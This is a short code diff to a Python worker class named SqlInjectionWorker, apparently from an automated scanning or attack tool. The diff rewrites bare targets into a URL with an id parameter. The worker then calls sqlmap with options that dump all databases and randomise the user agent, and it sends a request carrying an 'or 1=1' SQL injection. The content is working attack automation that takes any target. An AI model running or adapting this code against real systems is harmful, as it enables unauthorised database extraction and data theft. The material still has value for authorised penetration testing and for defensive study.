@@ -15,16 +15,21 @@ class SqlInjectionWorker(BaseWorker):
     serializer = SqlInjectionSerializer
 
     def run(self):
+        target = self.serialized_data.get("target")
+
+        if "http" not in target:
+            target = f"http://{target}:10201/get/?id=1"
+
         process = subprocess.run(
             args=[
-                "sqlmap", "-u", self.serialized_data.get("target"),
+                "sqlmap", "-u", target,
                 "-a", "--batch", "--dump-all", "--random-agent"
             ],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE
         )
 
-        r = requests.get(f"{self.serialized_data.get('target')} or 1=1;")
+        r = requests.get(f"{target} or 1=1;")
 
 
 
